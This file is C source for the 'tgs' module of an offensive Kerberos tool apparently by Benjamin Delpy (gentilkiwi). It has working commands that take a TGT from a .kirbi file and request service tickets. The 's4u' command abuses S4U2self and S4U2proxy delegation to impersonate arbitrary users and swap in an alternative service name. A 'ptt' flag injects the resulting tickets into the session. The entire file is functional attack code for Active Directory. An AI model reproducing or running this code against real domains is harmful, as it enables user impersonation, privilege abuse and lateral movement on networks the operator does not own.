/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_tgs.h"

const KUHL_M_C kuhl_m_c_tgs[] = {
	{kuhl_m_tgs_ask,	L"ask",		L"Ask a TGS from a previous TGT"},
	{kuhl_m_tgs_s4u,	L"s4u",		L"S4U"},
	{kuhl_m_tgs_renew,	L"renew",	L"Ask a ticket renewal"},
};
const KUHL_M kuhl_m_tgs = {
	L"tgs",	L"TGS module", NULL,
	ARRAYSIZE(kuhl_m_c_tgs), kuhl_m_c_tgs, NULL, NULL
};

NTSTATUS kuhl_m_tgs_ask(int argc, wchar_t * argv[])
{
	PCWSTR szData;
	PKULL_M_SOCK socket;
	OssBuf TgsReq = {0, NULL};
	KULL_M_ASN1_KRB_CRED *KrbCred = NULL, *AddKrbCred = NULL;
	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL, *AddEncKrbCred = NULL;
	KULL_M_ASN1_TGS_REP *TgsRep = NULL;
	KULL_M_ASN1_EncKDCRepPart *encTgsRepPart = NULL;
	PWSTR domain, dupService, nextSetToken, SetToken;
	KULL_M_ASN1_PrincipalName pService;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;
	KULL_M_ASN1_Realm realm;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;
	if(kull_m_string_args_byName(argc, argv, L"tgt", &szData, NULL))
	{
		kprintf(L"Ticket  : %s\n", szData);
		if(kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &KrbCred, &encKrbCred))
		{
			if(domain = kull_m_string_qad_ansi_to_unicode(KrbCred->tickets->value.realm))
			{
				if(kull_m_string_args_byName(argc, argv, L"add", &szData, NULL))
				{
					kprintf(L"Additionnal Ticket: %s\n", szData);
					kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &AddKrbCred, &AddEncKrbCred);
				}
				if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(domain, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
				{
					if(kull_m_string_args_byName(argc, argv, L"service", &szData, NULL))
					{
						kprintf(L"Service(s):\n");
						if(dupService = _wcsdup(szData))
						{
							for(nextSetToken = NULL, SetToken = wcstok_s(dupService, L",", &nextSetToken); SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
							{
								realm = NULL;
								kull_m_kerberos_asn1_PrincipalName_create_fromName(&pService, &realm, SetToken);
								kprintf(L"  ");
								kull_m_kerberos_asn1_PrincipalName_descr(&pService, FALSE);
								if(realm)
									kprintf(L" @ %S", realm);
								kprintf(L"\n");
								if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, (encKrbCred->ticket_info->value.bit_mask & KULL_M_ASN1_pname_present) ? &encKrbCred->ticket_info->value.pname : NULL, KrbCred->tickets->value.realm, &pService, realm, AddKrbCred ? (KERB_KDCOPTION_standard | KERB_KDCOPTION_request_anonymous) : 0, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, AddKrbCred ? &AddKrbCred->tickets->value : NULL, NULL, NULL))
								{
									if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, KULL_M_ASN1_TGS_REP_PDU))
									{
										if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep, &encKrbCred->ticket_info->value.key, KULL_M_ASN1_EncTGSRepPart_PDU, &encTgsRepPart))
										{
											kull_m_kerberos_asn1_KdcRep_save(TgsRep, encTgsRepPart, NULL, NULL, callback);
											ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart);
										}
										ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep);
									}
									ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
								}
								kull_m_kerberos_asn1_PrincipalName_delete(&pService);
								if(realm)
									free(realm);
							}
							free(dupService);
						}
					}
					else PRINT_ERROR(L"A service name is needed ( /service:cifs/target.domain.local[,http/webserver.domain.local] )\n");
					kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
				}
				if(AddEncKrbCred)
					ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, AddEncKrbCred);
				if(AddKrbCred)
					ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, AddKrbCred);
				LocalFree(domain);
			}
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
		}
	}
	else PRINT_ERROR(L"A TGT is needed ( /tgt:filename.kirbi )\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgs_s4u(int argc, wchar_t * argv[])
{
	PCWSTR szData;
	PKULL_M_SOCK socket;
	OssBuf TgsReq = {0, NULL}, TgsReq2 = {0, NULL};
	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;
	KULL_M_ASN1_TGS_REP *TgsRep = NULL, *TgsRep2 = NULL;
	KULL_M_ASN1_EncKDCRepPart *encTgsRepPart = NULL, *encTgsRepPart2 = NULL;
	PWSTR domain, dupService, nextSetToken, SetToken, separator;
	KULL_M_ASN1_PrincipalName pUser, pService, pAltService, tmp, tmp2;
	KULL_M_ASN1_PA_DATA PaForUser = {0};
	BOOL pacWanted = kull_m_string_args_byName(argc, argv, L"pac", NULL, NULL);
	KULL_M_ASN1__octet1 pac;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;
	if(kull_m_string_args_byName(argc, argv, L"tgt", &szData, NULL))
	{
		kprintf(L"Ticket  : %s\n", szData);
		if(kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &KrbCred, &encKrbCred))
		{
			if(domain = kull_m_string_qad_ansi_to_unicode(KrbCred->tickets->value.realm))
			{
				if(kull_m_string_args_byName(argc, argv, L"user", &szData, NULL))
				{
					kull_m_kerberos_asn1_PrincipalName_create_fromName(&pUser, NULL, szData);
					kprintf(L"  [s4u2self]  ");
					kull_m_kerberos_asn1_PrincipalName_descr(&pUser, FALSE);
					kprintf(L"\n");
					if(kull_m_kerberos_asn1_PA_DATA_FOR_USER_build(&PaForUser, &pUser, KrbCred->tickets->value.realm, &encKrbCred->ticket_info->value.key))
					{
						if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &encKrbCred->ticket_info->value.pname, KrbCred->tickets->value.realm, &encKrbCred->ticket_info->value.pname, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_enc_tkt_in_skey, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, pacWanted ? &KrbCred->tickets->value : NULL, NULL, &PaForUser))
						{
							if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(domain, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
							{
								if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, KULL_M_ASN1_TGS_REP_PDU))
								{
									if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep, &encKrbCred->ticket_info->value.key, KULL_M_ASN1_EncTGSRepPart_PDU, &encTgsRepPart))
									{
										kull_m_kerberos_asn1_KdcRep_save(TgsRep, encTgsRepPart, NULL, NULL, callback);
										ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart);
									}
									if(pacWanted)
									{
										if(kull_m_kerberos_asn1_PAC_from_EncTicketPart(&encKrbCred->ticket_info->value.key, &TgsRep->ticket.enc_part, &pac))
										{
											kuhl_m_kerberos_pac_info_data((PPACTYPE) pac.value, pac.length, NULL);
											if(pac.value)
												LocalFree(pac.value);
										}
									}
									else if(kull_m_string_args_byName(argc, argv, L"service", &szData, NULL))
									{
										kprintf(L"Service(s):\n");
										if(dupService = _wcsdup(szData))
										{
											for(nextSetToken = NULL, SetToken = wcstok_s(dupService, L",", &nextSetToken); SetToken; SetToken = wcstok_s(NULL, L",", &nextSetToken))
											{
												separator = wcschr(SetToken, L'|');
												if(separator && *(separator + 1))
												{
													*separator = L'\0';
													separator++;
													kull_m_kerberos_asn1_PrincipalName_create_fromName(&pAltService, NULL, separator);
												}
												else separator = NULL;

												kull_m_kerberos_asn1_PrincipalName_create_fromName(&pService, NULL, SetToken);
												kprintf(L"  [s4u2proxy] ");
												kull_m_kerberos_asn1_PrincipalName_descr(&pService, FALSE);
												kprintf(L"\n");
												
												if(separator)
												{
													kprintf(L"  [s4u2proxy] Alternative ServiceName: ");
													kull_m_kerberos_asn1_PrincipalName_descr(&pAltService, FALSE);
													kprintf(L"\n");
												}
												
												if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq2, &encKrbCred->ticket_info->value.pname, KrbCred->tickets->value.realm, &pService, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_request_anonymous, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, &TgsRep->ticket, NULL, NULL))
												{
													if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq2, (LPVOID *) &TgsRep2, KULL_M_ASN1_TGS_REP_PDU))
													{
														if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep2, &encKrbCred->ticket_info->value.key, KULL_M_ASN1_EncTGSRepPart_PDU, &encTgsRepPart2))
														{
															if(separator)
															{
																tmp = TgsRep2->ticket.sname;
																tmp2 = encTgsRepPart2->sname;
																TgsRep2->ticket.sname = pAltService;
																encTgsRepPart2->sname = pAltService;
															}
															kull_m_kerberos_asn1_KdcRep_save(TgsRep2, encTgsRepPart2, NULL, separator ? L"_ALT" : NULL, callback);
															if(separator)
															{
																TgsRep2->ticket.sname = tmp;
																encTgsRepPart2->sname = tmp2;
															}
															ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart2);
														}
														ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep2);
													}
													ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq2.value);
												}
												kull_m_kerberos_asn1_PrincipalName_delete(&pService);

												if(separator)
													kull_m_kerberos_asn1_PrincipalName_delete(&pAltService);
											}
											free(dupService);
										}
									}
									ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep);
								}
								kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
							}
							ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
						}
						ossFreeBuf(&kull_m_kerberos_asn1_world, PaForUser.padata_value.value);
					}
					kull_m_kerberos_asn1_PrincipalName_delete(&pUser);
				}
				else PRINT_ERROR(L"A user/account is needed ( /user:username )\n");
				LocalFree(domain);
			}
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
		}
	}
	else PRINT_ERROR(L"A TGT is needed ( /tgt:filename.kirbi )\n");
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_tgs_renew(int argc, wchar_t * argv[])
{
	PCWSTR szData;
	PKULL_M_SOCK socket;
	OssBuf TgsReq = {0, NULL};
	KULL_M_ASN1_KRB_CRED *KrbCred = NULL;
	KULL_M_ASN1_EncKrbCredPart *encKrbCred = NULL;
	PWSTR domain;
	KULL_M_ASN1_TGS_REP *TgsRep = NULL;
	KULL_M_ASN1_EncKDCRepPart *encTgsRepPart = NULL;
	PKULL_M_KERBEROS_ASN1_SAVEKDCREP_CALLBACK callback = NULL;

	if(kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL))
		callback = kuhl_m_kerberos_ptt_data;
	if(kull_m_string_args_byName(argc, argv, L"ticket", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"tgt", &szData, NULL) || kull_m_string_args_byName(argc, argv, L"tgs", &szData, NULL))
	{
		kprintf(L"Ticket  : %s\n", szData);
		if(kull_m_kerberos_asn1_KrbCred_load(szData, NULL, &KrbCred, &encKrbCred))
		{
			if(domain = kull_m_string_qad_ansi_to_unicode(KrbCred->tickets->value.realm))
			{
				if(kull_m_kerberos_asn1_TgsReq_build(&TgsReq, &encKrbCred->ticket_info->value.pname, KrbCred->tickets->value.realm, &encKrbCred->ticket_info->value.sname, NULL, KERB_KDCOPTION_standard | KERB_KDCOPTION_renew, &KrbCred->tickets->value, &encKrbCred->ticket_info->value.key, NULL, NULL, NULL))
				{
					if(socket = kull_m_kerberos_asn1_net_AddressSocket_create(domain, KERBEROS_DEFAULT_PORT, argc, argv, TRUE))
					{
						if(kull_m_kerberos_asn1_net_callKdcOssBuf(socket, &TgsReq, (LPVOID *) &TgsRep, KULL_M_ASN1_TGS_REP_PDU))
						{
							if(kull_m_kerberos_asn1_EncKDCRepPart_from_Rep_Key_build(TgsRep, &encKrbCred->ticket_info->value.key, KULL_M_ASN1_EncTGSRepPart_PDU, &encTgsRepPart))
							{
								kull_m_kerberos_asn1_KdcRep_save(TgsRep, encTgsRepPart, NULL, L"(renew)", callback);
								ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncTGSRepPart_PDU, encTgsRepPart);
							}
							ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_TGS_REP_PDU, TgsRep);
						}
						kull_m_kerberos_asn1_net_AddressSocket_delete(socket);
					}
					ossFreeBuf(&kull_m_kerberos_asn1_world, TgsReq.value);
				}
				LocalFree(domain);
			}
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_EncKrbCredPart_PDU, encKrbCred);
			ossFreePDU(&kull_m_kerberos_asn1_world, KULL_M_ASN1_KRB_CRED_PDU, KrbCred);
		}
	}
	else PRINT_ERROR(L"A ticket is needed ( /ticket|tgt|tgs:filename.kirbi )\n");
	return STATUS_SUCCESS;
}